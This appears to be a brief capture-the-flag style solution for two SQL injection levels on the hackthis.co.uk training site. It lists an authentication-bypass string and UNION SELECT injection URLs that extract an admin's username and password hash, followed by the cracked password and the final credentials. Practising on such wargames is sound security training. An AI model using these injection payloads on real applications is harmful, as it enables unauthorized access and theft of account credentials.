### SQLi Level 1
```
' OR 1=1 --
```

### SQLi Level 2
https://www.hackthis.co.uk/levels/sqli/2?browse&q='UNION ALL SELECT username, password FROM members WHERE admin=1--

=> bellamond

https://www.hackthis.co.uk/levels/sqli/2?browse&q=' UNION SELECT password,2 from members where admin=1 --

1b774bc166f3f8918e900fcef8752817bae76a37 => sup3r
```
bellamond/sup3r
```